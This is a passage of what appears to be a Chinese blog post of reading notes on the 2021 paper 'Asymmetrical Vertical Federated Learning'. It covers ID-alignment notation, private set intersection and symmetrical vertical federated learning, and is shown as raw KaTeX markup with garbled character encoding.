mtight">2</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2481em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.14643em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1464em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.08222em;">Y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0822em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span></span> ä¸ºå…³äº <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="script">D</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi mathvariant="script">D</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">\mathcal{D}_1,\mathcal{D}_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> çš„<code>å¾…å¯¹é½ï¼ˆpre-ID-alignmentï¼‰æ•°æ®é›†</code>ï¼Œæ»¡è¶³ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="script">I</mi><mn>1</mn></msub><mo>âˆˆ</mo><msubsup><mi mathvariant="script">I</mi><mn>1</mn><mi>o</mi></msubsup><mo separator="true">,</mo><msub><mi mathvariant="script">I</mi><mn>2</mn></msub><mo>âˆˆ</mo><msubsup><mi mathvariant="script">I</mi><mn>2</mn><mi>o</mi></msubsup></mrow><annotation encoding="application/x-tex">\mathcal{I}_1\in\mathcal{I}_1^o,\mathcal{I}_2\in\mathcal{I}_2^o</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">âˆˆ</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.9314em;vertical-align:-0.2481em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-2.4519em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">o</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2481em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">âˆˆ</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.9314em;vertical-align:-0.2481em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-2.4519em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">o</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2481em;"><span></span></span></span></span></span></span></span></span></span>ï¼ˆ<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi mathvariant="script">I</mi><mi>i</mi><mi>o</mi></msubsup></mrow><annotation encoding="application/x-tex">\mathcal{I}_i^o</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.942em;vertical-align:-0.2587em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-2.4413em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">o</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2587em;"><span></span></span></span></span></span></span></span></span></span>ä¸ºå¯¹é½å‰çš„æ•°æ®é›†å¯¹åº”çš„æ ·æœ¬ç©ºé—´ï¼‰ã€‚æ­¤å¤–ï¼Œæˆ‘ä»¬ä½¿ç”¨ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>I</mi><mi>w</mi></msup></mrow><annotation encoding="application/x-tex">I^w</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.02691em;">w</span></span></span></span></span></span></span></span></span></span></span> è¡¨ç¤ºå®Œæ•´çš„IDç©ºé—´ï¼Œå…¶åŒ…å« <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi mathvariant="script">D</mi><mn>1</mn><mi>o</mi></msubsup></mrow><annotation encoding="application/x-tex">\mathcal{D}_1^o</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9314em;vertical-align:-0.2481em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-2.4519em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">o</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2481em;"><span></span></span></span></span></span></span></span></span></span> å’Œ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi mathvariant="script">D</mi><mn>2</mn><mi>o</mi></msubsup></mrow><annotation encoding="application/x-tex">\mathcal{D}_2^o</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9314em;vertical-align:-0.2481em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-2.4519em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">o</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2481em;"><span></span></span></span></span></span></span></span></span></span> ä¸­çš„æ‰€æœ‰å¯èƒ½çš„å…ƒç´ ã€‚</p><p><img src="/2022/07/16/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB-%E9%9A%90%E7%A7%81%E4%BF%9D%E6%8A%A4-2021-Asymmetrical-Vertical-Federated-Learning-%E7%AC%94%E8%AE%B0/image-20220717100303601.png" alt></p><h2 id="Private-Set-Intersection">Private Set Intersection</h2><p>åœ¨æ ‡å‡†<code>éšç§æ±‚äº¤(PSI)</code>ä¸­ï¼Œæ¯ä¸€ä¸ªå‚ä¸æ–¹ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="script">P</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">\mathcal{P}_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.08222em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0822em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> æ‹¥æœ‰ä¸€ä¸ªåŒ…å«æ‰€æœ‰æœºå¯†æ•°æ®çš„æ•°æ®é›†<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>S</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">S_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>ã€‚æ‰€æœ‰çš„å‚ä¸æ–¹ä¼šåä½œæ±‚å‡ºäº¤é›†<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>S</mi><mo mathvariant="normal">â€²</mo></msup><mo>=</mo><msub><mo>âˆ©</mo><mi>i</mi></msub><msub><mi>S</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">S^\prime=\cap_i{S_i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7519em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">â€²</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mbin">âˆ©</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></span>ï¼Œä¸æ­¤åŒæ—¶æ¯ä¸€å‚ä¸æ–¹ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="script">P</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">\mathcal{P}_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.08222em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0822em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> ä¿æŒ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>S</mi><mi>i</mi></msub><mi mathvariant="normal">/</mi><msup><mi>S</mi><mo mathvariant="normal">â€²</mo></msup></mrow><annotation encoding="application/x-tex">S_i / S^\prime</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0019em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">/</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">â€²</span></span></span></span></span></span></span></span></span></span></span> ç§æœ‰ã€‚PSIçš„å®ç°æ–¹æ³•å¯ä»¥åŸºäºï¼š</p><ul><li>ä¼ ç»Ÿçš„å…¬é’¥å¯†ç ä½“ç³»</li><li>ä¸ç»æ„ä¼ è¾“</li><li>æ··æ·†ç”µè·¯</li></ul><h2 id="Symmetrical-and-Asymmetrical">Symmetrical and Asymmetrical</h2><p>åœ¨ä¸Šé¢çš„å›¾1ä¸­ï¼Œ<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="script">P</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">\mathcal{P}_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.08222em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0822em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> å’Œ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="script">P</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">\mathcal{P}_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.08222em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0822em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> å°±å¾…å¯¹é½æ ·æœ¬çš„å…ƒç´ æ•°é‡ä¸Šæ‹¥æœ‰åŒç­‰çš„åœ°ä½ã€‚äº‹å®ä¸Šï¼Œå³ä½¿<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="script">P</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">\mathcal{P}_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.08222em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0822em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>éšæœºé€‰æ‹© <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi><mo>âˆˆ</mo><msup><mi mathvariant="script">I</mi><mi>w</mi></msup></mrow><annotation encoding="application/x-tex">e\in \mathcal{I}^w</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">âˆˆ</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.02691em;">w</span></span></span></span></span></span></span></span></span></span></span>ï¼Œä¹Ÿä¼šæœ‰ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mrow><mo fence="true">âˆ£</mo><msubsup><mi mathvariant="script">I</mi><mn>2</mn><mi>o</mi></msubsup><mo fence="true">âˆ£</mo></mrow><mi mathvariant="normal">/</mi><mrow><mo fence="true">âˆ£</mo><msup><mi mathvariant="script">I</mi><mi>w</mi></msup><mo fence="true">âˆ£</mo></mrow><mo>â‰«</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">\left|\mathcal{I}_{2}^{o}\right| /\left|\mathcal{I}^{w}\right| \gg 0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">âˆ£</span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-2.4519em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2481em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">âˆ£</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">/</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">âˆ£</span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.02691em;">w</span></span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">âˆ£</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰«</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span> çš„æ¦‚ç‡é€‰åˆ° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi><mo>âˆˆ</mo><msup><mi mathvariant="script">I</mi><mi>w</mi></msup></mrow><annotation encoding="application/x-tex">e\in \mathcal{I}^w</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">âˆˆ</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.02691em;">w</span></span></span></span></span></span></span></span></span></span></span>ã€‚åœ¨è¿™ç§&quot;<code>å¼ºè”é‚¦ï¼ˆfederation of the strongï¼‰</code>&quot;ä¸­ï¼Œæ¯ä¸€æ–¹éƒ½ä¸ä¼šåœ¨æ‰§è¡ŒPSIåè®®æ±‚äº¤é›† <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="script">I</mi><mn>1</mn></msub><mo>=</mo><msub><mi mathvariant="script">I</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">\mathcal{I}_1=\mathcal{I}_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> çš„è¿‡ç¨‹ä¸­æŒæ¡å¾ˆå¤šçš„ä¿¡æ¯ï¼Œå› æ­¤ä¹Ÿä¸ä¼šè®©å¯¹æ–¹çŸ¥é“è‡ªå·±å¾ˆå¤šçš„IDä¿¡æ¯ï¼Œæœ¬æ–‡ç§°è¿™ç§æ–¹æ¡ˆä¸º<code>å¯¹ç§°çºµå‘è”é‚¦å­¦ä¹ ï¼ˆSymmetrical Vertical Federated Learningï¼ŒSVFLï¼‰</code>ã€‚</p><p><img src="/2022/07/16/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB-%E9%9A%90%E7%A7%81%E4%BF%9D%E6%8A%A4-2021-Asymmetrical-Vertical-Federated-Learning-%E7%AC%94%E8%AE%B0/image-20220717115752191.png" alt></p><p>ä¸SVFLç›¸åçš„æƒ…å†µæ˜¯ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="script">P</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">\mathcal{P}_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.08222em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0822em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> æœ‰ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mrow><mo fence="true">âˆ£</mo><msubsup><mi mathvariant="script">I</mi><mn>2</mn><mi>o</mi></msubsup><mo fence="true">âˆ£</mo></mrow><mi mathvariant="normal">/</mi><mrow><mo fence="true">âˆ£</mo><msup><mi mathvariant="script">I</mi><mi>w</mi></msup><mo fence="true">âˆ£</mo></mrow><mo>â‰ˆ</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">\left|\mathcal{I}_{2}^{o}\right| /\left|\mathcal{I}^{w}\right| \approx 